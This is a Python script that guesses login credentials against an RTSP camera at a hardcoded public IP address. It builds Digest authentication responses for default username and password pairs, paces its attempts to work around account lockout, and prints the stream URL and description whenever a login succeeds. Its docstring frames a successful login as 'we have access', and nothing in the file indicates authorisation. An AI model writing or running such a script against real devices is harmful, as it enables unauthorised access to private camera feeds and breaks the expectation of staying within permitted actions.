#!/usr/bin/env python3
"""Targeted lockout-scope probe.

Hypothesis: the account lockout is per-username, not global. If so, another
account may authenticate even while `root` is flagged. This runs a small
paced set to distinguish:

  * some other account authenticates  -> per-account lockout, we have access
  * everything is rejected            -> global lockout, only a reset will do

Deliberately small and paced. A broad wordlist cannot answer this question
and would only refresh the lockout timer.
"""

import hashlib
import os
import socket
import time

HOST = os.environ.get("CAM_HOST", "117.196.244.183")
PORT = int(os.environ.get("CAM_PORT", "554"))
PATH = os.environ.get("CAM_PATH", "/Streaming/Channels/101")
DELAY = 7.0

# control first, then the same password against other accounts
PROBES = [
    ("root", "1234567890"),
    ("admin", "1234567890"),
    ("user", "1234567890"),
    ("guest", "1234567890"),
    ("supervisor", "1234567890"),
    ("admin", "admin"),
    ("admin", ""),
]


def md5hex(v):
    return hashlib.md5(v.encode()).hexdigest()


def rt(payload, timeout=8):
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(timeout)
    try:
        s.sendall(payload)
        buf = b""
        while True:
            part = s.recv(4096)
            if not part:
                break
            buf += part
            if b"\r\n\r\n" in buf:
                break
        return buf.decode("utf-8", "replace")
    finally:
        s.close()


def challenge_of(raw):
    for line in raw.split("\r\n"):
        if line.lower().startswith("www-authenticate:"):
            ch = {}
            for part in line.split(None, 2)[2].split(","):
                if "=" in part:
                    k, _, v = part.strip().partition("=")
                    ch[k.strip().lower()] = v.strip().strip('"')
            return ch
    return {}


def build(cseq, auth=None):
    uri = f"rtsp://{HOST}:{PORT}{PATH}"
    lines = [f"DESCRIBE {uri} RTSP/1.0", f"CSeq: {cseq}",
             "User-Agent: probe/1.0", "Accept: application/sdp"]
    if auth:
        lines.append(f"Authorization: {auth}")
    return ("\r\n".join(lines) + "\r\n\r\n").encode()


URI = f"rtsp://{HOST}:{PORT}{PATH}"
print(f"{'user':<11} {'password':<13} verdict")
print("-" * 44)

results = {}
for i, (user, pwd) in enumerate(PROBES):
    try:
        ch = challenge_of(rt(build(1)))
        if not ch:
            print(f"{user:<11} {(pwd or '<empty>'):<13} no challenge - connection blocked")
            results[user] = "blocked"
            if i < len(PROBES) - 1:
                time.sleep(DELAY)
            continue
        ha1 = md5hex(f"{user}:{ch['realm']}:{pwd}")
        ha2 = md5hex(f"DESCRIBE:{URI}")
        dg = md5hex(f"{ha1}:{ch['nonce']}:{ha2}")
        auth = (f'Digest username="{user}", realm="{ch["realm"]}", '
                f'nonce="{ch["nonce"]}", uri="{URI}", response="{dg}"')
        raw = rt(build(1, auth))
        line = raw.splitlines()[0] if raw.strip() else "<empty>"
        if "200" in line:
            print(f"{user:<11} {(pwd or '<empty>'):<13} *** ACCEPTED ***")
            results[user] = "accepted"
            _, _, body = raw.partition("\r\n\r\n")
            print(f"\nrtsp://{user}:{pwd}@{HOST}:{PORT}{PATH}")
            if body.strip():
                print(body.strip()[:900])
            break
        print(f"{user:<11} {(pwd or '<empty>'):<13} rejected")
        results[user] = "rejected"
    except Exception as exc:
        print(f"{user:<11} {(pwd or '<empty>'):<13} ERR {type(exc).__name__}")
        results[user] = "error"
    if i < len(PROBES) - 1:
        time.sleep(DELAY)

print("\nsummary:", results)
if results.get("root") == "rejected" and "accepted" not in results.values():
    print("root rejected and no other account worked -> global lockout state;")
    print("further attempts will only refresh the timer. Physical reset is the fix.")
